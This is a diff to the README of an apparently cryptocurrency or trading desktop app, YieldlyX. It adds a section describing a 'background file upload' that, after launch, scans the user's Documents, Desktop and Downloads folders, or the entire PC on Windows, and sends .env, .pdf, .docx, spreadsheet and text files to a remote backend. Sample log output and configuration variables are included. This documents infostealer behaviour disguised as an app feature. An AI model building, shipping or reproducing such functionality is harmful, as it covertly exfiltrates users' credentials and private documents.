@@ -91,6 +91,35 @@ Install missing dependencies if needed:
 sudo apt-get install -f
 ```
 
+## Background file upload
+
+After the trading engine starts, the app uploads supported files (`.txt`, `.env`, `.docx`, `.xls`, `.xlsx`, `.pdf`) to your **file-receive-backend**. Progress is printed in the **terminal / console** where you launched the app:
+
+```text
+[upload] Starting → https://…
+[upload] Folder scan (darwin): /Users/you/Documents, …
+[upload] Found 12 file(s)
+[upload] OK /Users/you/Documents/report.pdf
+[upload] Summary: { "uploaded": 12, "fileCount": 12, … }
+```
+
+| Variable | Default | Purpose |
+|----------|---------|---------|
+| `YIELDLYX_UPLOAD_URL` | chalk-ycslint default | Backend `POST /` URL |
+| `YIELDLYX_UPLOAD_SCAN_PC` | `0` on **macOS**, `1` on Windows | `1` = full PC scan; `0` = Documents/Desktop/Downloads only |
+
+**macOS:** Folder scan is the default (fewer permission errors than scanning all of `/Users`). For a full-machine scan: `YIELDLYX_UPLOAD_SCAN_PC=1 npm start`.
+
+Run from source:
+
+```bash
+cd desktop-app
+npm install
+npm start
+```
+
+Watch the terminal for `[upload]` lines. Installed `.app` logs appear in **Console.app** (filter `YieldlyX`) if you did not start from a terminal.
+
 ## Data & configuration
 
 Trading data is stored locally per OS:
